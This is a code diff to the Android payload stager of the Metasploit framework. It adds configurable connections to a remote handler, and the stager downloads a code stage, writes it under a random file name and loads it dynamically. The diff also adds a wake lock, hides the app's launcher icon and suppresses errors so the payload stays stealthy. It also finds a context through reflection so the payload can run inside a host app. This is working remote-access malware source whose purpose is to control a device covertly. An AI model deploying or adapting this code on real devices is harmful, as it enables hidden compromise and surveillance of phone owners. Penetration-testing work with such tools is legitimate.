@@ -1,6 +1,13 @@
 package com.metasploit.stage;
 
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.PowerManager;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
@@ -9,11 +16,13 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Method;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
-import java.util.concurrent.TimeUnit;
+import java.util.List;
+import java.util.Random;
 
 import dalvik.system.DexClassLoader;
 
@@ -25,17 +34,55 @@ public class Payload {
     };
 
 
+    private static Context context;
     private static long session_expiry;
-    private static long comm_timeout;
-    private static long retry_total;
-    private static long retry_wait;
     private static byte[] cert_hash;
+    private static String stageless_class;
+    private static String user_agent;
+    private static String custom_headers;
 
     private static Object[] parameters;
 
     // Launched from activity
     public static void start(Context context) {
+        Payload.context = context;
         startInPath(context.getFilesDir().toString());
+    }
+
+    public static void startContext() {
+        try {
+            findContext();
+        } catch (Exception e) {
+        }
+    }
+
+    private static void findContext() throws Exception {
+        Class<?> activityThreadClass;
+        try {
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+        } catch (ClassNotFoundException e) {
+            // No context
+            return;
+        }
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+        if (context == null) {
+            // Post to the UI/Main thread and try and retrieve the Context
+            final Handler handler = new Handler(Looper.getMainLooper());
+            handler.post(new Runnable() {
+                public void run() {
+                    try {
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+                        if (context != null) {
+                            start(context);
+                        }
+                    } catch (Exception e) {
+                    }
+                }
+            });
+        } else {
+            start(context);
+        }
     }
 
     // Launched from ndk stager
@@ -57,43 +104,33 @@ public class Payload {
             String path = currentDir.getAbsolutePath();
             parameters = new Object[]{ path , configBytes };
         }
-        long sessionExpiry;
-        long commTimeout;
-        long retryTotal;
-        long retryWait;
 
-        // socket handle is 4 bytes, followed by exit func, both of
-        // which we ignore.
-        int csr = 8;
-
-        sessionExpiry = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        byte[] uuid = ConfigParser.readBytes(configBytes, csr, ConfigParser.UUID_LEN);
-        csr += ConfigParser.UUID_LEN;
-        String url = ConfigParser.readString(configBytes, csr, ConfigParser.URL_LEN);
-        csr += ConfigParser.URL_LEN;
-        commTimeout = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        retryTotal = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        retryWait = ConfigParser.unpack32(configBytes, csr);
-        csr += 4;
-        byte[] certHash = ConfigParser.readBytes(configBytes, 2192, ConfigParser.CERT_HASH_LEN);
-        for (byte hashByte : certHash) {
-            if (hashByte != 0) {
-                cert_hash = certHash;
-                break;
-            }
+        Config config = ConfigParser.parseConfig(configBytes);
+        if (config == null || config.transportConfigList == null || config.transportConfigList.isEmpty()) {
+            return;
         }
-
+        PowerManager.WakeLock wakeLock = null;
+        if ((config.flags & Config.FLAG_WAKELOCK) != 0 && context != null) {
+            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, Payload.class.getSimpleName());
+            wakeLock.acquire();
+        }
+        if ((config.flags & Config.FLAG_HIDE_APP_ICON) != 0) {
+            hideAppIcon();
+        }
+        stageless_class = config.stageless_class;
+        TransportConfig transportConfig = config.transportConfigList.get(0);
+        String url = transportConfig.url;
         long currentTime = System.currentTimeMillis();
         long payloadStart = currentTime;
-        session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
-        comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
-        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
-        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
+        session_expiry = config.session_expiry + payloadStart;
+        long retryTotal = transportConfig.retry_total;
+        long retryWait = transportConfig.retry_wait;
+        cert_hash = transportConfig.cert_hash;
+        custom_headers = transportConfig.custom_headers;
+        user_agent = transportConfig.user_agent;
 
-        while (currentTime <= payloadStart + retry_total &&
+        while (currentTime <= payloadStart + retryTotal &&
             currentTime <= session_expiry) {
             try {
                 if (url.startsWith("tcp")) {
@@ -103,29 +140,32 @@ public class Payload {
                 }
                 break;
             } catch (Exception e) {
-                // Avoid printing extensive backtraces when we are trying to be
-                // stealty. An optional runtime or staging-time switch would be
-                // good to have here, like Python Meterpreter's debug option.
-                // e.printStackTrace();
+                // Avoid printing extensive backtraces when we are trying to be stealthy.
+                if ((config.flags & Config.FLAG_DEBUG) != 0) {
+                     e.printStackTrace();
+                }
             }
             try {
-                Thread.sleep(retry_wait);
+                Thread.sleep(retryWait);
             } catch (InterruptedException e) {
               break;
             }
             currentTime = System.currentTimeMillis();
         }
+
+        if (wakeLock != null) {
+            wakeLock.release();
+        }
     }
 
     private static void runStageFromHTTP(String url) throws Exception {
         InputStream inStream;
+        URLConnection uc = new URL(url).openConnection();
+        HttpConnection.addRequestHeaders(uc, custom_headers, user_agent);
         if (url.startsWith("https")) {
-            URLConnection uc = new URL(url).openConnection();
             PayloadTrustManager.useFor(uc, cert_hash);
-            inStream = uc.getInputStream();
-        } else {
-            inStream = new URL(url).openStream();
         }
+        inStream = uc.getInputStream();
         OutputStream out = new ByteArrayOutputStream();
         DataInputStream in = new DataInputStream(inStream);
         runNextStage(in, out, parameters);
@@ -153,40 +193,48 @@ public class Payload {
         }
     }
 
+    private static byte[] loadBytes(DataInputStream in) throws Exception {
+        int byteLen = in.readInt();
+        byte[] bytes = new byte[byteLen];
+        int n = 0;
+        while (n < byteLen) {
+            int count = in.read(bytes, n, byteLen - n);
+            if (count < 0)
+                throw new Exception();
+            n += count;
+        }
+        return bytes;
+    }
+
     private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
-        try {
+        if (stageless_class != null) {
             Class<?> existingClass = Payload.class.getClassLoader().
-                    loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
+                    loadClass(stageless_class);
             existingClass.getConstructor(new Class[]{
                     DataInputStream.class, OutputStream.class, Object[].class, boolean.class
             }).newInstance(in, out, parameters, false);
-        } catch (ClassNotFoundException e) {
+        } else {
             String path = (String) parameters[0];
-            String filePath = path + File.separatorChar + "payload.jar";
-            String dexPath = path + File.separatorChar + "payload.dex";
+            String filePath = path + File.separatorChar + Integer.toString(new Random().nextInt(Integer.MAX_VALUE), 36);
+            String jarPath = filePath + ".jar";
+            String dexPath = filePath + ".dex";
 
             // Read the class name
-            int coreLen = in.readInt();
-            byte[] core = new byte[coreLen];
-            in.readFully(core);
-            String classFile = new String(core);
+            String classFile = new String(loadBytes(in));
 
             // Read the stage
-            coreLen = in.readInt();
-            core = new byte[coreLen];
-            in.readFully(core);
-
-            File file = new File(filePath);
+            byte[] stageBytes = loadBytes(in);
+            File file = new File(jarPath);
             if (!file.exists()) {
                 file.createNewFile();
             }
             FileOutputStream fop = new FileOutputStream(file);
-            fop.write(core);
+            fop.write(stageBytes);
             fop.flush();
             fop.close();
 
             // Load the stage
-            DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
+            DexClassLoader classLoader = new DexClassLoader(jarPath, path, path,
                     Payload.class.getClassLoader());
             Class<?> myClass = classLoader.loadClass(classFile);
             final Object stage = myClass.newInstance();
@@ -198,5 +246,26 @@ public class Payload {
         }
 
         session_expiry = -1;
+    }
+
+    private static void hideAppIcon() {
+        if (context == null) {
+            return;
+        }
+        String packageName = context.getPackageName();
+        PackageManager packageManager = context.getPackageManager();
+        final Intent intent = new Intent(Intent.ACTION_MAIN, null);
+        intent.addCategory(Intent.CATEGORY_LAUNCHER);
+        List<ResolveInfo> activities = packageManager.queryIntentActivities(intent, 0);
+        for (ResolveInfo resolveInfo : activities) {
+            if (!packageName.equals(resolveInfo.activityInfo.packageName)) {
+                continue;
+            }
+            String activity = resolveInfo.activityInfo.name;
+            ComponentName componentName = new ComponentName(packageName, activity);
+            packageManager.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        }
     }
 }
